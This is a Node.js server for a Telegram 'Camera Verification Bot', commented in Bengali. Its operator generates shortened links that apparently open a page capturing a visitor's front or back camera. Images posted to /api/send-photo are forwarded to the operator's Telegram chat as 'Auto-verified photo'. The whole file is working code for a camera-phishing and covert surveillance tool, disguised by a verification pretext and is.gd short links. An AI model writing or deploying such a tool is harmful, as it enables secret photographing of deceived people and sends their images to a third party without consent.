require('dotenv').config();
const express = require('express');
const cors = require('cors');
const TelegramBot = require('node-telegram-bot-api');
const crypto = require('crypto');

const app = express();
const PORT = process.env.PORT || 3000;
const BOT_TOKEN = process.env.BOT_TOKEN;
const BASE_URL = process.env.BASE_URL;

app.use(cors());
app.use(express.json({ limit: '3mb' })); // মেমোরি বাঁচাতে 3mb করা হলো

const bot = new TelegramBot(BOT_TOKEN, { polling: false });

// সেশন এবং ইউজার সেটিংস
const activeSessions = {}; // sessionId -> { chatId, timestamp }
const userSettings = {};   // chatId -> { facingMode }

// --- Webhook Route ---
app.post(`/bot${BOT_TOKEN}`, (req, res) => {
  bot.processUpdate(req.body);
  res.sendStatus(200);
});

// --- Telegram Bot Commands ---
bot.onText(/\/start/, (msg) => {
  const chatId = msg.chat.id;
  userSettings[chatId] = { facingMode: 'user' };

  const opts = {
    reply_markup: {
      inline_keyboard: [
        [{ text: '📷 Front Camera', callback_data: 'cam_front' }, { text: '📸 Back Camera', callback_data: 'cam_back' }],
        [{ text: '🔗 Generate Link', callback_data: 'gen_link' }]
      ]
    }
  };

  const statusMsg = `🟢 *Server is Live!*\n\nWelcome to the Camera Verification Bot.\nSelect camera mode and click Generate Link.`;
  bot.sendMessage(chatId, statusMsg, { parse_mode: 'Markdown', ...opts });
});

bot.on('callback_query', async (query) => {
  const chatId = query.message.chat.id;
  const data = query.data;

  if (!userSettings[chatId]) userSettings[chatId] = { facingMode: 'user' };

  if (data === 'cam_front') {
    userSettings[chatId].facingMode = 'user';
    bot.answerCallbackQuery(query.id, { text: '✅ Front camera selected!' });
    
    bot.editMessageReplyMarkup({
      inline_keyboard: [
        [{ text: '✅ Front Camera', callback_data: 'cam_front' }, { text: '📸 Back Camera', callback_data: 'cam_back' }],
        [{ text: '🔗 Generate Link', callback_data: 'gen_link' }]
      ]
    }, { chat_id: chatId, message_id: query.message.message_id });

  } else if (data === 'cam_back') {
    userSettings[chatId].facingMode = 'environment';
    bot.answerCallbackQuery(query.id, { text: '✅ Back camera selected!' });

    bot.editMessageReplyMarkup({
      inline_keyboard: [
        [{ text: '📷 Front Camera', callback_data: 'cam_front' }, { text: '✅ Back Camera', callback_data: 'cam_back' }],
        [{ text: '🔗 Generate Link', callback_data: 'gen_link' }]
      ]
    }, { chat_id: chatId, message_id: query.message.message_id });

  } else if (data === 'gen_link') {
    const facing = userSettings[chatId].facingMode;
    
    const sessionId = crypto.randomBytes(4).toString('hex');
    
    // সেশন তৈরি করার সময় টাইমস্ট্যাম্প যোগ করা হলো
    activeSessions[sessionId] = { 
      chatId: chatId, 
      createdAt: Date.now() 
    };
    
    const longLink = `${BASE_URL}/?s=${sessionId}&f=${facing}`;
    
    try {
      // is.gd API ব্যবহার
      const response = await fetch(`https://is.gd/create.php?format=simple&url=${encodeURIComponent(longLink)}`);
      const shortLink = await response.text();

      if (!shortLink.startsWith('https://is.gd/')) {
        throw new Error("Shortener failed");
      }

      bot.sendMessage(chatId, `Here is your verification link:\n\n🔗 [Click here to open](${shortLink})\n\n*Camera:* ${facing === 'user' ? 'Front' : 'Back'}\n*Data will be sent only to this chat.*`, { parse_mode: 'Markdown' });
    } catch (err) {
      bot.sendMessage(chatId, `Error creating short link. Here is the direct link:\n${longLink}`);
    }
    
    bot.answerCallbackQuery(query.id, { text: 'Link generated!' });
  }
});

// --- API Endpoint to receive photos ---
app.post('/api/send-photo', async (req, res) => {
  try {
    const { imageData, sessionId } = req.body;

    const session = activeSessions[sessionId];
    if (!session) {
      return res.status(403).json({ error: "Invalid or expired session." });
    }

    if (!imageData) {
      return res.status(400).json({ error: "Missing image data" });
    }

    const base64Data = imageData.split(',')[1];
    const buffer = Buffer.from(base64Data, 'base64');

    // বাফার মেমোরি থেকে ছবি পাঠানো
    await bot.sendPhoto(session.chatId, buffer, { caption: "📸 Auto-verified photo" });
    
    // মেমোরি ক্লিয়ার করতে বাফারটি নাল করা (Optional but good practice)
    buffer.fill(0); 

    res.json({ success: true });

  } catch (error) {
    console.error("Error sending photo:", error);
    res.status(500).json({ error: "Failed to send photo" });
  }
});

// --- 🧹 মেমোরি ক্লিনার (প্রতি ৫ মিনিটে চলবে) ---
setInterval(() => {
  const now = Date.now();
  const FIVE_MINUTES = 5 * 60 * 1000;
  let cleanedSessions = 0;

  for (const sessionId in activeSessions) {
    // যদি সেশন ৫ মিনিটের বেশি পুরনো হয়, তবে ডিলিট করে দাও
    if (now - activeSessions[sessionId].createdAt > FIVE_MINUTES) {
      delete activeSessions[sessionId];
      cleanedSessions++;
    }
  }

  // মেমোরি ক্লিন করার লগ (Suga Logs-এ দেখা যাবে)
  if (cleanedSessions > 0) {
    console.log(`🧹 Memory Cleaned: Removed ${cleanedSessions} expired sessions.`);
  }
  
  // Node.js-কে গার্বেজ কলেকশন করতে বলা (যদি গ্লোবাল gc অ্যাক্সেস থাকে)
  if (global.gc) {
    global.gc();
  }
}, FIVE_MINUTES);

// --- সার্ভার রান এবং Webhook সেটআপ ---
app.listen(PORT, async () => {
  console.log(`Server running on port ${PORT}`);
  
  const sugaPublicHostname = process.env.SUGA_PUBLIC_HOSTNAME;

  if (sugaPublicHostname) {
    const publicUrl = sugaPublicHostname.startsWith('http') 
      ? sugaPublicHostname 
      : `https://${sugaPublicHostname}`;
      
    const webhookUrl = `${publicUrl}/bot${BOT_TOKEN}`;
    
    try {
      await bot.setWebHook(webhookUrl);
      console.log(`✅ Webhook set successfully to: ${webhookUrl}`);
    } catch (err) {
      console.error("❌ Failed to set webhook:", err.message);
    }
  } else {
    console.warn("⚠️ SUGA_PUBLIC_HOSTNAME not found. Webhook could not be set.");
  }
});